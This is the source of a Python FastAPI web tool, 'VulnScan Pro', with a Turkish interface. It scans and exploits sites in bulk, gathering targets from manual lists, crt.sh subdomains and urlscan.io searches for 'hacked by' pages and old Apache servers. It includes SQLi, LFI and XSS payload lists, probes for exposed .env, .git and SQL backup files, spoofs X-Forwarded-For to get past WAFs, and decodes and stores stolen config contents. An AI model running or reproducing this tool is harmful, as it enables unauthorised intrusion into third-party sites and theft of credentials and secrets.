from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
import random
import re
import base64
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Pro - Ultimate Deep Scan")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET VE PAYLOAD LİSTELERİ ---
COMMON_DIRS = [
    "/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php", 
    "/.git/config", "/.svn/entries", "/backup.sql", "/db.sql", "/docker-compose.yml"
]
COMMON_PORTS = [21, 22, 80, 443, 3306, 8080, 8443]

SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
TIME_SQLI_PAYLOADS = ["1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark"]

LFI_PAYLOADS = [
    "../../../../etc/passwd", 
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=config.php", 
    "php://filter/convert.base64-encode/resource=.env"
]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"]

# --- ASENKRON VERİTABANI KAYDI ---
async def save_finding(url, vuln, payload, data):
    def db_insert():
        with get_db() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO findings (target_url, vuln_type, payload, extracted_data, timestamp) 
                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
            conn.commit()
    await asyncio.to_thread(db_insert)

# --- PORT TARAMA ---
async def scan_ports(ip, results):
    for port in COMMON_PORTS:
        try:
            fut = asyncio.open_connection(ip, port)
            reader, writer = await asyncio.wait_for(fut, timeout=2)
            writer.close()
            await writer.wait_closed()
            results.append({"type": "Port", "detail": f"Açık Port: {port}", "evidence": "TCP Bağlantısı Başarılı"})
        except:
            pass

# --- ALT ALAN ADI KEŞFİ (crt.sh) ---
async def fetch_subdomains(session, domain):
    logger.info(f"Alt alan adları aranıyor: {domain}")
    subdomains = set()
    try:
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        async with session.get(url, timeout=15) as res:
            if res.status == 200:
                data = await res.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    for sub in name_value.split('\n'):
                        if sub and '*' not in sub:
                            subdomains.add(f"http://{sub.strip()}")
                            subdomains.add(f"https://{sub.strip()}")
    except Exception as e:
        logger.error(f"crt.sh Hatası: {e}")
    return list(subdomains)

# --- TARAMA VE SÖMÜRÜ MOTORU ---
async def scan_and_exploit(session, target_url, config):
    report = {"target": target_url, "vulns": [], "status": "OK", "waf": False}
    
    # WAF ve IP Atlatma Başlıkları
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }
    
    try:
        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=headers) as response:
            if response.status not in [200, 301, 302]:
                report["status"] = f"HTTP {response.status}"
                await manager.broadcast({"type": "scan_result", "data": report})
                return

            res_headers = response.headers
            if "cloudflare" in res_headers.get("Server", "").lower() or "cf-ray" in res_headers:
                report["waf"] = True
                
            # CORS Kontrolü
            if res_headers.get("Access-Control-Allow-Origin") == "*":
                report["vulns"].append({"type": "CORS Misconfig", "detail": "Wildcard (*)", "evidence": "Cross-Origin Leak"})

            parsed_url = urllib.parse.urlparse(target_url)
            ip = parsed_url.hostname

            # Port Taraması
            if config.get("ports"):
                await scan_ports(ip, report["vulns"])

            # Dizin ve Admin Panel Taraması
            if config.get("dirs"):
                for path in COMMON_DIRS:
                    test_url = f"{target_url.rstrip('/')}{path}"
                    try:
                        async with session.get(test_url, timeout=4, ssl=False, headers=headers) as res:
                            if res.status == 200:
                                size = res.headers.get('Content-Length', '0')
                                if path.endswith('.sql') and int(size) > 1000000:
                                    report["vulns"].append({"type": "Kritik Veri", "payload": path, "evidence": f"Büyük SQL: {size} bytes"})
                                elif "admin" in path or "login" in path:
                                    report["vulns"].append({"type": "Admin Panel", "payload": path, "evidence": "HTTP 200 OK"})
                                else:
                                    report["vulns"].append({"type": "Dizin/Config", "payload": path, "evidence": "HTTP 200 OK"})
                    except: pass

            # SQLi
            if config.get("sqli"):
                for payload in SQLI_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=headers) as res:
                            text = (await res.text()).lower()
                            for error in SQL_ERRORS:
                                if error in text:
                                    report["vulns"].append({"type": "SQLi", "payload": payload, "evidence": error})
                                    await save_finding(target_url, "SQLi", payload, error)
                                    break
                    except: pass

            # LFI & Sömürü
            if config.get("lfi"):
                for payload in LFI_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=headers) as res:
                            text = await res.text()
                            if "root:x:0:0" in text or "[extensions]" in text:
                                report["vulns"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası okundu"})
                                await save_finding(target_url, "LFI", payload, "System File Read")
                                break
                            elif payload.startswith("php://") and len(text) > 20:
                                try:
                                    decoded = base64.b64decode(text.strip()).decode('utf-8', errors='ignore')
                                    exploit_evidence = decoded[:50].replace('\n', ' ') + "..."
                                    report["vulns"].append({"type": "LFI (Exploited)", "payload": payload, "evidence": exploit_evidence})
                                    await save_finding(target_url, "LFI Exploit", payload, exploit_evidence)
                                except: pass
                                break
                    except: pass

    except Exception:
        report["status"] = "ERROR"
        
    if report["vulns"]:
        report["status"] = "SIZILDI"
        
    await manager.broadcast({"type": "scan_result", "data": report})

# --- ARKA PLAN PİPELINE ---
async def run_scan_pipeline(config: dict):
    limit = config.get("limit", 50)
    threads = config.get("threads", 50)
    subdomain = config.get("subdomain", "")
    manual_urls = config.get("manual_urls", "")
    
    logger.info(f"Derin Tarama Başlatıldı. Limit: {limit} | Threads: {threads}")
    
    connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        targets = set()
        
        # Manuel URL Ekleme
        if manual_urls:
            for url in manual_urls.split('\n'):
                url = url.strip()
                if url:
                    if not url.startswith("http"): url = "http://" + url
                    targets.add(url)
            logger.info(f"{len(targets)} manuel hedef eklendi.")
            
        # Alt Alan Adı Keşfi
        if subdomain and len(targets) < limit:
            subs = await fetch_subdomains(session, subdomain)
            targets.update(subs)
            logger.info(f"{len(subs)} alt alan adı bulundu.")
            
        # OSINT (URLScan)
        if len(targets) < limit:
            try:
                queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"']
                for q in queries:
                    if len(targets) >= limit: break
                    url = f"https://urlscan.io/api/v1/search/?q={urllib.parse.quote(q)}&size={limit}"
                    async with session.get(url, timeout=10) as res:
                        if res.status == 200:
                            data = await res.json()
                            for result in data.get('results', []):
                                page_url = result.get('page', {}).get('url')
                                if page_url and page_url.startswith("http"):
                                    targets.add(page_url)
            except Exception as e:
                logger.error(f"OSINT Hatası: {e}")
                
        targets = list(targets)[:limit]
        
        if not targets:
            logger.warning("Taranacak hedef bulunamadı.")
            return
            
        logger.info(f"Toplam {len(targets)} hedef taranıyor...")
        
        semaphore = asyncio.Semaphore(threads)
        async def limited_scan(url):
            async with semaphore:
                await scan_and_exploit(session, url, config)

        tasks = [limited_scan(url) for url in targets]
        await asyncio.gather(*tasks)
        
    logger.info("Derin Tarama Tamamlandı.")

# --- API ENDPOINT'LERİ ---
class ScanConfig(BaseModel):
    limit: int
    threads: int
    subdomain: str
    manual_urls: str
    ports: bool
    dirs: bool
    sqli: bool
    lfi: bool
    xss: bool

@app.post("/api/scan")
async def start_scan(config: ScanConfig, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_scan_pipeline, config.dict())
    return {"status": "started"}

@app.get("/api/report")
async def get_report():
    with get_db() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM findings ORDER BY timestamp DESC")
        rows = c.fetchall()
        report = [{"id": r[0], "url": r[1], "type": r[2], "payload": r[3], "evidence": r[4], "date": r[5]} for r in rows]
    return JSONResponse(content={"report": report})

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan Pro | Ultimate Deep Scan</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #06080a; --panel: #11141a; --border: #1f2430;
                --text: #e2e8f0; --accent: #3b82f6; --danger: #ef4444;
                --warning: #f59e0b; --success: #10b981;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
            
            /* Top Bar (Header) */
            .top-bar { background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; }
            .logo h1 { font-size: 1.4rem; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
            .logo span { font-size: 0.8rem; background: var(--accent); color: #fff; padding: 2px 8px; border-radius: 4px; }
            
            .status-indicator { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: #94a3b8; }
            .led { width: 10px; height: 10px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 8px var(--danger); }
            .led.connected { background: var(--success); box-shadow: 0 0 8px var(--success); }

            /* Control Panel */
            .control-panel { background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; display: flex; gap: 20px; align-items: flex-end; flex-wrap: wrap; }
            .input-group { display: flex; flex-direction: column; gap: 5px; }
            .input-group label { font-size: 0.75rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; }
            .input-group input, .input-group textarea { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; outline: none; transition: 0.2s; }
            .input-group input:focus, .input-group textarea:focus { border-color: var(--accent); }
            .input-group textarea { height: 40px; resize: vertical; }
            
            .toggle-group { display: flex; gap: 10px; margin-bottom: 2px; }
            .toggle-btn { background: var(--bg); border: 1px solid var(--border); color: #94a3b8; padding: 10px 15px; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: 0.2s; user-select: none; }
            .toggle-btn.active { background: rgba(59, 130, 246, 0.15); border-color: var(--accent); color: var(--accent); }
            
            .btn-start { background: var(--danger); color: #fff; border: none; padding: 10px 25px; border-radius: 6px; font-weight: 800; font-size: 0.95rem; cursor: pointer; transition: 0.2s; height: 42px; box-shadow: 0 0 15px rgba(239, 68, 68, 0.3); }
            .btn-start:hover { background: #dc2626; box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
            .btn-start:disabled { background: #334155; box-shadow: none; cursor: not-allowed; }
            
            .btn-report { background: transparent; border: 1px solid var(--success); color: var(--success); padding: 10px 15px; border-radius: 6px; font-weight: 600; font-size: 0.85rem; text-decoration: none; transition: 0.2s; height: 42px; display: flex; align-items: center; }
            .btn-report:hover { background: rgba(16, 185, 129, 0.1); }

            /* Stats Bar */
            .stats-bar { display: flex; background: #0d1117; border-bottom: 1px solid var(--border); padding: 10px 25px; gap: 40px; }
            .stat-item { display: flex; flex-direction: column; }
            .stat-label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
            .stat-value { font-size: 1.3rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
            .stat-value.scanned { color: var(--accent); }
            .stat-value.vuln { color: var(--danger); }
            .stat-value.clean { color: var(--success); }
            .stat-value.error { color: var(--warning); }

            /* Main Layout */
            .main-layout { display: flex; flex: 1; overflow: hidden; }
            
            /* Terminal (Logs) */
            .terminal-panel { width: 40%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .panel-header { padding: 12px 20px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.75rem; color: #94a3b8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; }
            .terminal { flex: 1; overflow-y: auto; padding: 15px 20px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
            .log-line { margin-bottom: 6px; word-wrap: break-word; display: flex; gap: 10px; }
            .log-time { color: #475569; min-width: 65px; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }

            /* Results Table */
            .table-panel { width: 60%; display: flex; flex-direction: column; background: var(--bg); }
            .table-tools { padding: 10px 20px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; gap: 15px; }
            .table-tools input { flex: 1; background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 10px 15px; border-radius: 6px; font-size: 0.85rem; outline: none; transition: 0.2s; }
            .table-tools input:focus { border-color: var(--accent); }
            
            .table-container { flex: 1; overflow-y: auto; padding: 20px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 14px 20px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
            th { background: #11141a; color: #94a3b8; font-weight: 600; position: sticky; top: 0; z-index: 10; }
            tr:hover { background: #161b22; }
            
            .badge { padding: 4px 10px; border-radius: 4px; font-size: 0.7rem; font-weight: 700; letter-spacing: 0.5px; }
            .badge-vuln { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
            .badge-clean { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
            .badge-err { background: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
            .badge-waf { background: rgba(139, 92, 246, 0.15); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); margin-left: 8px; }
            
            .vuln-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #fca5a5; display: block; margin-top: 4px; }
            .vuln-detail span { color: #fff; }
        </style>
    </head>
    <body>
        <!-- Top Bar -->
        <div class="top-bar">
            <div class="logo">
                <h1>VulnScan Pro <span>DEEP SCAN</span></h1>
            </div>
            <div class="status-indicator">
                <div class="led" id="ws-led"></div>
                <span id="ws-status">Bağlantı Bekleniyor...</span>
            </div>
        </div>

        <!-- Control Panel -->
        <div class="control-panel">
            <div class="input-group">
                <label>Hedef Domain (Subdomain)</label>
                <input type="text" id="subdomain" placeholder="example.com">
            </div>
            <div class="input-group" style="flex: 1;">
                <label>Manuel Hedefler (Alt Alta)</label>
                <textarea id="manual_urls" placeholder="http://hedef1.com&#10;http://hedef2.com"></textarea>
            </div>
            <div class="input-group" style="width: 100px;">
                <label>Limit</label>
                <input type="number" id="limit" value="100" min="10" max="1000">
            </div>
            <div class="input-group" style="width: 100px;">
                <label>Thread</label>
                <input type="number" id="threads" value="50" min="10" max="200">
            </div>
            
            <div class="input-group">
                <label>Modüller</label>
                <div class="toggle-group">
                    <div class="toggle-btn active" id="mod-ports" onclick="toggleBtn(this)">Port</div>
                    <div class="toggle-btn active" id="mod-dirs" onclick="toggleBtn(this)">Dizin</div>
                    <div class="toggle-btn active" id="mod-sqli" onclick="toggleBtn(this)">SQLi</div>
                    <div class="toggle-btn active" id="mod-lfi" onclick="toggleBtn(this)">LFI</div>
                    <div class="toggle-btn active" id="mod-xss" onclick="toggleBtn(this)">XSS</div>
                </div>
            </div>

            <button class="btn-start" id="startBtn" onclick="startScan()">TARAMAYI BAŞLAT</button>
            <a href="/api/report" target="_blank" class="btn-report">JSON RAPOR</a>
        </div>

        <!-- Stats Bar -->
        <div class="stats-bar">
            <div class="stat-item">
                <span class="stat-label">Taranan Hedef</span>
                <span class="stat-value scanned" id="stat-scanned">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Açık Bulunan</span>
                <span class="stat-value vuln" id="stat-vuln">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Temiz Çıkan</span>
                <span class="stat-value clean" id="stat-clean">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Hata / Yanıtsız</span>
                <span class="stat-value error" id="stat-error">0</span>
            </div>
        </div>

        <!-- Main Layout -->
        <div class="main-layout">
            <div class="terminal-panel">
                <div class="panel-header">Sistem Konsolu</div>
                <div id="terminal" class="terminal">
                    <div class="log-line"><span class="log-time">[SİSTEM]</span><span class="log-info">Arayüz hazır. Tarama bekleniyor...</span></div>
                </div>
            </div>
            
            <div class="table-panel">
                <div class="table-tools">
                    <input type="text" id="searchBar" placeholder="URL veya Zafiyet Ara..." onkeyup="filterTable()">
                </div>
                <div class="table-container">
                    <table id="resultsTable">
                        <thead>
                            <tr>
                                <th>Hedef URL</th>
                                <th>Durum</th>
                                <th>Zafiyet Detayları</th>
                            </tr>
                        </thead>
                        <tbody id="tableBody">
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const tableBody = document.getElementById('tableBody');
            const wsLed = document.getElementById('ws-led');
            const wsStatus = document.getElementById('ws-status');
            
            let stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };

            ws.onopen = function() {
                wsLed.classList.add('connected');
                wsStatus.innerText = "Bağlantı Aktif";
            };

            ws.onclose = function() {
                wsLed.classList.remove('connected');
                wsStatus.innerText = "Bağlantı Koptu";
            };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span><span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    stats.scanned++;
                    
                    const res = data.data;
                    let statusBadge = "";
                    let detailHtml = "";
                    let rowClass = "";
                    
                    if (res.status === "SIZILDI") {
                        stats.vuln++;
                        statusBadge = `<span class="badge badge-vuln">AÇIK</span>`;
                        detailHtml = res.vulns.map(v => `<span class="vuln-detail">> <span>${v.type}</span>: ${v.payload || v.detail}</span>`).join('');
                        rowClass = "vuln-row";
                    } else if (res.status === "ERROR" || res.status.startsWith("HTTP")) {
                        stats.error++;
                        statusBadge = `<span class="badge badge-err">${res.status}</span>`;
                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Yanıt yok.</span>`;
                    } else {
                        stats.clean++;
                        statusBadge = `<span class="badge badge-clean">TEMİZ</span>`;
                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Zafiyet yok.</span>`;
                    }

                    if (res.waf) {
                        statusBadge += `<span class="badge badge-waf">WAF</span>`;
                    }

                    document.getElementById('stat-scanned').innerText = stats.scanned;
                    document.getElementById('stat-vuln').innerText = stats.vuln;
                    document.getElementById('stat-clean').innerText = stats.clean;
                    document.getElementById('stat-error').innerText = stats.error;

                    const tr = document.createElement("tr");
                    tr.className = rowClass;
                    tr.setAttribute('data-search', (res.target + " " + res.status).toLowerCase());
                    
                    tr.innerHTML = `
                        <td style="font-family:'JetBrains Mono', monospace; word-break:break-all;">${res.target}</td>
                        <td>${statusBadge}</td>
                        <td>${detailHtml}</td>
                    `;
                    
                    tableBody.insertBefore(tr, tableBody.firstChild);
                }
            };

            function toggleBtn(btn) {
                btn.classList.toggle('active');
            }

            function filterTable() {
                const input = document.getElementById("searchBar");
                const filter = input.value.toLowerCase();
                const trs = document.getElementById("resultsTable").querySelectorAll("tbody tr");

                trs.forEach(tr => {
                    const searchData = tr.getAttribute('data-search');
                    if (searchData && searchData.includes(filter)) {
                        tr.style.display = "";
                    } else {
                        tr.style.display = "none";
                    }
                });
            }

            async function startScan() {
                const btn = document.getElementById('startBtn');
                btn.disabled = true;
                btn.innerText = "TARANIYOR...";
                
                terminal.innerHTML = "";
                tableBody.innerHTML = "";
                stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
                document.getElementById('stat-scanned').innerText = 0;
                document.getElementById('stat-vuln').innerText = 0;
                document.getElementById('stat-clean').innerText = 0;
                document.getElementById('stat-error').innerText = 0;

                const config = {
                    limit: parseInt(document.getElementById('limit').value),
                    threads: parseInt(document.getElementById('threads').value),
                    subdomain: document.getElementById('subdomain').value.trim(),
                    manual_urls: document.getElementById('manual_urls').value.trim(),
                    ports: document.getElementById('mod-ports').classList.contains('active'),
                    dirs: document.getElementById('mod-dirs').classList.contains('active'),
                    sqli: document.getElementById('mod-sqli').classList.contains('active'),
                    lfi: document.getElementById('mod-lfi').classList.contains('active'),
                    xss: document.getElementById('mod-xss').classList.contains('active')
                };

                try {
                    await fetch('/api/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(config)
                    });
                } catch (error) {
                    console.error("API Hatası:", error);
                } finally {
                    btn.disabled = false;
                    btn.innerText = "TARAMAYI BAŞLAT";
                }
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
